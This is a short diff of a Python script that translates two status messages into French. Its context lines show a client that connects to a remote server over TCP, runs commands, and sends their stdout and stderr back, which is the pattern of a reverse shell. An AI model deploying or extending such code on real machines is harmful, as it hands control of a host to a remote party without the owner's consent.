@@ -7,7 +7,7 @@ port_number = 1234
 def connect_to_server():
     cs = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     cs.connect((ip_address, port_number))
-    print("Connected to the server")
+    print("Connecté au serveur :)")
 
     while True:
         try:
@@ -19,7 +19,7 @@ def connect_to_server():
 
             output = result.stdout + result.stderr
             if not output:
-                output = "Command executed successfully, no output."
+                output = "Commande executée, pas de sortie !."
             cs.send(output.encode())
         except Exception as e:
             cs.send(f"Error: {e}".encode())
